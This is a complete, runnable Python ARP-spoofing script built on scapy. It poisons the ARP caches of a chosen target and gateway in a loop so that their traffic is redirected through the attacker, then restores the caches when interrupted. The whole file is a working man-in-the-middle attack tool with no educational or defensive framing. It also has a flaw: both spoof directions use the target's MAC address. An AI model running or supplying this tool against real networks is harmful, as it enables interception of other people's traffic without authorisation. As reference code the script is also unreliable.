#!/usr/bin/env python

import scapy.all as scapy
import optparse
import time
import sys

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast=broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    packet=scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac=get_mac(destination_ip)
    source_mac=get_mac(source_ip)
    packet=scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False)

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target_ip", help="Target IP")
    parser.add_option("-g", "--gateway", dest="gateway_ip", help="Gateway IP")
    options = parser.parse_args()[0]

    if not options.target_ip:
        parser.error("[-]please specify target ip address, use --help for more info")

    if not options.gateway_ip:
        parser.error("[-]please specify gateway ip address, use --help for more info")

    return options


args=get_arguments()
target_ip = args.target_ip
gateway_ip = args.gateway_ip
target_mac=get_mac(target_ip)
sent_packets_count=0

try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count = sent_packets_count + 2
        print("\r[+]Packets sent:" + str(sent_packets_count)),
        sys.stdout.flush()
        time.sleep(2)

except KeyboardInterrupt:
    print("\n[+]Ctrl+C, Terminated.")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)


